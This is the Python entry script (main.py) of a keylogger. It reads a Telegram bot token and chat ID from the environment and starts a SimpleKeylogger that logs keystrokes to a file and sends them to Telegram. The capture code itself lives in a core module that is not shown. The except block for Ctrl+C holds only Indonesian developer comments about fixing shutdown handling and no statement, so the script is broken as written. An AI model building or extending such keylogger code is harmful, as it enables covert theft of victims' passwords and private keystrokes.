# main.py
import os
import sys
from dotenv import load_dotenv
from keylogger.core import SimpleKeylogger

def main():
    print("\033[1;33m[*]\033[0m Initializing keylogger...")
    load_dotenv()
    TELEGRAM_TOKEN = os.getenv("TELEGRAM_TOKEN")
    TELEGRAM_CHAT_ID = os.getenv("TELEGRAM_CHAT_ID")

    logger = SimpleKeylogger(
        filename="keylog.txt",
        telegram_token=TELEGRAM_TOKEN,
        telegram_chat_id=TELEGRAM_CHAT_ID
    )

    try:
        logger.start()
    except KeyboardInterrupt:
        print("\n\033[1;31m[!]\033[0m Keylogger interrupted by user (Ctrl+C)")
        # Kita perlu memanggil print_footer, tapi kita tidak punya akses ke start_time dll di sini?
        # Sebaiknya kita tangani di dalam start() dengan except KeyboardInterrupt di sana.
        # Atau kita bisa simpan referensi. Untuk sederhana, kita biarkan start() menangani Ctrl+C.
        # Tapi di core.py kita sudah menangani listener.join() yang akan berhenti jika ada exception.
        # Kita perlu menambahkan penanganan KeyboardInterrupt di core.start() juga.
        # Mari kita perbaiki di core.py: bungkus listener.join() dengan try-except KeyboardInterrupt.
        # Nanti kita sesuaikan.

if __name__ == "__main__":
    main()